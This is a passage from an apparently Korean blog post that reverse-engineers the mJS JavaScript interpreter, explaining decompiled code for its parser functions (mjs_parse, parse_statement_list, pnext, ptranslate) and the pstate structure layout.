</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)bp_0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)bp_0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xEF</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x10</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mjs_execute</span>(mjsa, off, <span style="color:#f92672">&amp;</span>r);
</span></span></code></pre></div><p>mjs_exec_internal 함수의 인자로 path가 주어지는데, 이건 -e 옵션으로 직접 js 코드를 주면, <code>&lt;stdin&gt;</code> 문자열의 주소가 된다.
code는 말 그대로 js code의 포인터이다.
mjs는 그냥 mjs 객체이다.</p>
<p>mjs_parse와 mjs_execute가 분석해야할 주요 함수이다.
간단하게 기능을 알아보자면, mjs_parse는 문법을 분석해서 바이트 코드를 점화해서 mjs 객체에 추가해놓는다.
그리고 mjs_execute는 점화된 바이트 코드를 실행한다.</p>
<h3 id="mjs_parse">mjs_parse<a hidden class="anchor" aria-hidden="true" href="#mjs_parse">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_parse</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>CODE_, mjs <span style="color:#f92672">*</span>mjs)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> v3; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>a; <span style="color:#75715e">// [rsp+8h] [rbp-B8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// [rsp+10h] [rbp-B0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> map_len; <span style="color:#75715e">// [rsp+24h] [rbp-9Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> llen; <span style="color:#75715e">// [rsp+28h] [rbp-98h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> start_idx; <span style="color:#75715e">// [rsp+30h] [rbp-90h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  pstate p; <span style="color:#75715e">// [rsp+38h] [rbp-88h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> res; <span style="color:#75715e">// [rsp+A4h] [rbp-1Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>mjsa; <span style="color:#75715e">// [rsp+A8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>CODE; <span style="color:#75715e">// [rsp+B0h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>patha; <span style="color:#75715e">// [rsp+B8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  patha <span style="color:#f92672">=</span> path;
</span></span><span style="display:flex;"><span>  CODE <span style="color:#f92672">=</span> CODE_;
</span></span><span style="display:flex;"><span>  mjsa <span style="color:#f92672">=</span> mjs;
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> MJS_OK;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pinit</span>(path, CODE_, <span style="color:#f92672">&amp;</span>p);
</span></span><span style="display:flex;"><span>  p.mjs <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>  p.cur_idx <span style="color:#f92672">=</span> mjsa<span style="color:#f92672">-&gt;</span>bcode_gen.len;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_byte</span>(<span style="color:#f92672">&amp;</span>p, <span style="color:#ae81ff">0x24u</span>);                         <span style="color:#75715e">// OP_BCODE_HEADER = 0x24 start off
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  start_idx <span style="color:#f92672">=</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_append</span>(<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0xCuLL</span>);
</span></span><span style="display:flex;"><span>  a <span style="color:#f92672">=</span> p.mjs;
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> patha;
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(patha);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_append</span>(<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">-&gt;</span>bcode_gen, v6, v3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.buf[start_idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len <span style="color:#f92672">-</span> start_idx;
</span></span><span style="display:flex;"><span>  p.start_bcode_idx <span style="color:#f92672">=</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len;
</span></span><span style="display:flex;"><span>  p.cur_idx <span style="color:#f92672">=</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len;
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_statement_list</span>(<span style="color:#f92672">&amp;</span>p, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">emit_byte</span>(<span style="color:#f92672">&amp;</span>p, <span style="color:#ae81ff">0x23u</span>);                         <span style="color:#75715e">// OP_EXIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.buf[start_idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len <span style="color:#f92672">-</span> start_idx;
</span></span><span style="display:flex;"><span>  map_len <span style="color:#f92672">=</span> p.offset_lineno_map.len;
</span></span><span style="display:flex;"><span>  llen <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_llen</span>(<span style="color:#a6e22e">SLODWORD</span>(p.offset_lineno_map.len));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_resize</span>(<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen, llen <span style="color:#f92672">+</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.size);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cs_varint_encode</span>(map_len, (<span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.buf[p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len], llen);
</span></span><span style="display:flex;"><span>  p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len <span style="color:#f92672">+=</span> llen;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_append</span>(<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.buf[start_idx] <span style="color:#f92672">=</span> p.mjs<span style="color:#f92672">-&gt;</span>bcode_gen.len <span style="color:#f92672">-</span> start_idx;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_free</span>(<span style="color:#f92672">&amp;</span>p.offset_lineno_map);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( res )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mbuf_free</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>bcode_gen);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mjs_bcode_commit</span>(mjsa);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>mjs_parse 함수의 모습이다.
pinit은 pstate를 초기화해주는 함수이다.</p>
<pre tabindex="0"><code>00000000 pstate          struc ; (sizeof=0x68, align=0x8, copyof_117)
00000000                                         ; XREF: mjs_parse/r
00000000                                         ; parse_return/r ...
00000000 file_name       dq ?                    ; offset
00000008 buf             dq ?                    ; offset
00000010 pos             dq ?                    ; offset
00000018 line_no         dd ?
0000001C last_emitted_line_no dd ?
00000020 offset_lineno_map mbuf ?                ; XREF: mjs_parse+142/r
00000020                                         ; mjs_parse+1B0/r ...
00000038 prev_tok        dd ?
0000003C                 db ? ; undefined
0000003D                 db ? ; undefined
0000003E                 db ? ; undefined
0000003F                 db ? ; undefined
00000040 tok             tok ?
00000050 mjs             dq ?                    ; XREF: mjs_parse+36/w
00000050                                         ; mjs_parse+3A/r ... ; offset
00000058 start_bcode_idx dd ?                    ; XREF: mjs_parse+E5/w
0000005C cur_idx         dd ?                    ; XREF: mjs_parse+42/w
0000005C                                         ; mjs_parse+F0/w
00000060 depth           dd ?
00000064                 db ? ; undefined
00000065                 db ? ; undefined
00000066                 db ? ; undefined
00000067                 db ? ; undefined
00000068 pstate          ends
00000068
</code></pre><p>pstate 구조체는 위와 같다.</p>
<p>초기화가 잘 된다음에, parse_statement_list 함수로 들어간다.
이 함수가 제일 중요한 함수다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_statement_list</span>(pstate <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">int</span> et)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> v3; <span style="color:#75715e">// [rsp+Bh] [rbp-15h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> drop; <span style="color:#75715e">// [rsp+Ch] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> res; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> MJS_OK;
</span></span><span style="display:flex;"><span>  drop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">147</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">147LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pnext</span>(p);                                     <span style="color:#75715e">// cur_tok = 0xCA -&gt; STR
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )                                   <span style="color:#75715e">// 8,9 ()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  {
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( res <span style="color:#f92672">==</span> MJS_OK )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( p<span style="color:#f92672">-&gt;</span>tok.tok )
</span></span><span style="display:flex;"><span>        v3 <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">!=</span> et;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v3 )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( drop )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">1u</span>);
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_statement</span>(p);
</span></span><span style="display:flex;"><span>    drop <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">152</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">152LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pnext</span>(p);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>drop )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">0x11u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>pnext 함수는 다음 코드의 부분까지 파싱하는 함수다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">pnext</span>(pstate <span style="color:#f92672">*</span>p)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> tok; <span style="color:#75715e">// [rsp+0h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> toka; <span style="color:#75715e">// [rsp+0h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> tmp; <span style="color:#75715e">// [rsp+4h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> tmpa; <span style="color:#75715e">// [rsp+4h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  tok <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">skip_spaces_and_comments</span>(p);
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">-&gt;</span>tok.ptr <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>pos;
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">-&gt;</span>tok.len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>p<span style="color:#f92672">-&gt;</span>pos )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_digit</span>(<span style="color:#f92672">*</span>p<span style="color:#f92672">-&gt;</span>pos) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      tok <span style="color:#f92672">=</span> <span style="color:#a6e22e">getnum</span>(p);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>p<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\&#39;&#39;</span> <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>p<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#34;&#39;</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      tok <span style="color:#f92672">=</span> <span style="color:#a6e22e">getstr</span>(p);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_ident</span>(<span style="color:#f92672">*</span>p<span style="color:#f92672">-&gt;</span>pos) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      toka <span style="color:#f92672">=</span> <span style="color:#a6e22e">getident</span>(p);                       <span style="color:#75715e">// GET ALPHABET KEYWORLD ex) let a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      tok <span style="color:#f92672">=</span> toka <span style="color:#f92672">+</span> <span style="color:#a6e22e">is_reserved_word_token</span>(p<span style="color:#f92672">-&gt;</span>tok.ptr, p<span style="color:#f92672">-&gt;</span>tok.len);<span style="color:#75715e">// 32 reserved WORDS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strchr</span>(<span style="color:#e6db74">&#34;,.:;{}[]()?&#34;</span>, <span style="color:#f92672">*</span>p<span style="color:#f92672">-&gt;</span>pos) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      tok <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>p<span style="color:#f92672">-&gt;</span>pos;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok3</span>(p, <span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( tmp )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_24;
</span></span><span style="display:flex;"><span>      tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok3</span>(p, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( tmp )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_24;
</span></span><span style="display:flex;"><span>      tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok4</span>(p, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( tmp )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_24;
</span></span><span style="display:flex;"><span>      tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok3</span>(p, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( tmp )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_24;
</span></span><span style="display:flex;"><span>      tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok3</span>(p, <span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( tmp
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> (tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok3</span>(p, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">61</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> (tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok</span>(p, <span style="color:#e6db74">&#34;&amp;&#34;</span>, <span style="color:#e6db74">&#34;&amp;=&#34;</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> (tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok</span>(p, <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;|=&#34;</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> (tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok</span>(p, <span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;&lt;=&#34;</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> (tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok</span>(p, <span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;&gt;=&#34;</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> (tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok</span>(p, <span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;-=&#34;</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> (tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok</span>(p, <span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;+=&#34;</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>LABEL_24:
</span></span><span style="display:flex;"><span>        tok <span style="color:#f92672">=</span> tmp;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        tmpa <span style="color:#f92672">=</span> <span style="color:#a6e22e">longtok</span>(p, <span style="color:#e6db74">&#34;^~+-%/*&lt;&gt;=!|&amp;&#34;</span>, <span style="color:#e6db74">&#34;=&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( tmpa )
</span></span><span style="display:flex;"><span>          tok <span style="color:#f92672">=</span> tmpa;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    tok <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>p<span style="color:#f92672">-&gt;</span>pos )
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>p<span style="color:#f92672">-&gt;</span>pos;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_tok.c&#34;</span>, <span style="color:#ae81ff">250</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  --&gt; %d [%.*s]&#34;</span>, tok, p<span style="color:#f92672">-&gt;</span>tok.len, p<span style="color:#f92672">-&gt;</span>tok.ptr);
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">-&gt;</span>prev_tok <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>tok.tok;
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">=</span> <span style="color:#a6e22e">ptranslate</span>(tok);                 <span style="color:#75715e">// 8,9 -&gt; ()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> p<span style="color:#f92672">-&gt;</span>tok.tok;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이런식으로 세미콜론을 기준으로 자르거나 하면서 파싱을 해준다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">ptranslate</span>(<span style="color:#66d9ef">enum</span> mjs_TOK tok)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ( tok )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x21</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">22</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x25</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x26</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">17</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x28</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x29</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">9</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2A</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">12</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2B</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">13</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2C</span><span style="color:#f92672">:</span>
